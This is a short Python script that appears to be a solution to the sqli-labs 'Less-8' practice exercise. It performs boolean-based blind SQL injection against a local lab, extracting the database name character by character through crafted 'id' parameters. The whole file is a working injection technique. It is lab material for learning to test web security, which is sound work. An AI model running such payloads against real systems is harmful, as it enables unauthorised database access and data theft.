import requests

URL="http://127.0.0.1/sqli-labs-master/Less-8/"
payload1="?id=1' and 1=1%23"
payload2="?id=1' and 1=2%23"
a=requests.get(URL+payload1)
b=requests.get(URL+payload2)

def boole(ml):
    r=requests.get(URL+f"?id=1' and {ml}%23")
    return len(r.text)==len(a.text)

# def judge(sentence):



c=1
e=0
d=''
while e<129:
    if boole(f"ascii(substr(database(),{c},1))={e}"):
        c+=1
        d=d+chr(e)
        e=0
        print(d)
        if c==9:
            break
    else:
        e+=1
print("database=",d)